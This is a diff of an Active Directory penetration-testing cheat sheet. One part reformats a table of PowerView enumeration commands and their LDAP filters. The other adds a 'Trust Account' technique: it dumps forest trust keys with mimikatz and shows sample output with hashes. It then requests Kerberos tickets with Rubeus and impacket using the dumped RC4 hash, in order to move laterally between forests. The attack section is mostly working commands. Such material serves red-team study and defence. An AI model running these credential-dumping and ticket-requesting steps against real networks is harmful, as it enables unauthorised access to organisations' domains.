@@ -109,19 +109,19 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 **User-Force-Change-Password** | User | change user's password | [Force change user's password](#force-change-user-password) | ![](./src/images/Force-Change-User-Password.PNG)
 
 # LDAP Filters
-| PowerView | Description                    | LDAP Filter
-| ------------- | --------------- | ------------ |
-| `Get-DomainController`| Get current domain controller      |`(userAccountControl:1.2.840.113556.1.4.803:=8192)`|
-| `Get-Forest` |Get current forest|`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`|
-| `Get-DomainUser` | Get all domain users |`(&(samAccountType=805306368))`
-| `Get-DomainUser -TrustedToAuth` |Get trusted users for delegation|`(&(samAccountType=805306368)(msds-allowedtodelegateto=*))`
-| `Get-DomainUser -SPN` |Get non-null users' SPN|`(&(samAccountType=805306368)(servicePrincipalName=*))`
-| `Get-DomainUser -PreAuthNotRequired` |Get users that disable preauth|`(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`
-| `Get-DomainGroup` |Get all domain groups|`(&(objectCategory=group))`
-| `Get-DomainGroup *admin*` |Get specific domain group identity|<code>(&(samAccountType>(&(samAccountType=805306368)(&#124;(samAccountName=*admin*)))</code>
-| `Get-DomainComputer` |Get all domain computers|`(&(samAccountType=805306369))`
-| `Get-DomainComputer -Unconstrained` | Get all unconstrained domain computers|`(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))`
-| `Get-DomainGPO` | Get all domain GPO|`(&(objectCategory=groupPolicyContainer))`
+| PowerView                            | Description                            | LDAP Filter                                                                                  |
+| ------------------------------------ | -------------------------------------- | -------------------------------------------------------------------------------------------- |
+| `Get-DomainController`               | Get current domain controller          | `(userAccountControl:1.2.840.113556.1.4.803:=8192)`                                          |
+| `Get-Forest`                         | Get current forest                     | `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`                      |
+| `Get-DomainUser`                     | Get all domain users                   | `(&(samAccountType=805306368))`                                                              |
+| `Get-DomainUser -TrustedToAuth`      | Get trusted users for delegation       | `(&(samAccountType=805306368)(msds-allowedtodelegateto=*))`                                  |
+| `Get-DomainUser -SPN`                | Get non-null users' SPN                | `(&(samAccountType=805306368)(servicePrincipalName=*))`                                      |
+| `Get-DomainUser -PreAuthNotRequired` | Get users that disable preauth         | `(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`          |
+| `Get-DomainGroup`                    | Get all domain groups                  | `(&(objectCategory=group))`                                                                  |
+| `Get-DomainGroup *admin*`            | Get specific domain group identity     | <code>(&(samAccountType>(&(samAccountType=805306368)(&#124;(samAccountName=*admin*)))</code> |
+| `Get-DomainComputer`                 | Get all domain computers               | `(&(samAccountType=805306369))`                                                              |
+| `Get-DomainComputer -Unconstrained`  | Get all unconstrained domain computers | `(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))`           |
+| `Get-DomainGPO`                      | Get all domain GPO                     | `(&(objectCategory=groupPolicyContainer))`                                                   |
 
 Example use:
 ```
@@ -460,6 +460,29 @@ Find-ForeignUser
 Find-ForeignGroup
 ```
 
+### Trust Account
+_Note that this is not an exploit that could be escalated directly to higher privileged user. This is intend to give you a authenticated user access on another forest_
+Trust Account is created upon trust initiation (domain/trust) and it appears to be a member of Domain Users. Trust accounts will hold the same password/key on both domain/forest which we can use to move laterally from forest-to-forest.
+1. Get the trust account hash. This can either be obtained through [DCSync](#dcsync) or the following command to dump trust keys
+```
+mimikatz# lsadump::trust /patch 
+[[..snip..]]
+[ Out ] KIWI.LOCAL -> RANGE.NET
+    * 6/29/2022 1:05:07 PM - CLEAR   - 5e 88 f5 8e bf 01 83 8f 61 39 50 37 77 d8 ce 86 b0 90 f8 e4 b5 2e ef e2 03 dd bf 4c
+        * aes256_hmac       a3edf4ac6cb5ed1583434348a67454d66e9fcd25d97c3e930c24790dbfa1d15f
+        * aes128_hmac       6e362139cacfdd8956d986fc8e33f0e9
+        * rc4_hmac_nt       4cc0dd338664b4208fa6a1a4a7bee224
+[[..snip..]]
+```
+2. Request TGT for the trust account by using the key dumped (aes/rc4). _Note: this wouldn't work over NTLM authentication, only kerberos_
+```
+# rubeus
+Rubeus.exe asktgt /user:RANGE$ /rc4:4cc0dd338664b4208fa6a1a4a7bee224 /domain:kiwi.local /dc:kiwi-dc.kiwi.local /nowrap
+
+# impacket
+getTGT.py kiwi.local/range\$ -hashes :4cc0dd338664b4208fa6a1a4a7bee224 -dc-ip 192.168.86.189
+```
+3. Now you should be able to use the retrieved TGT to interact with the trusted forest.
 # Lateral Movement / Post Exploitation
 ### Overpass-The-Hash (OPTH)
 _Note: This requires local administrator privilege_
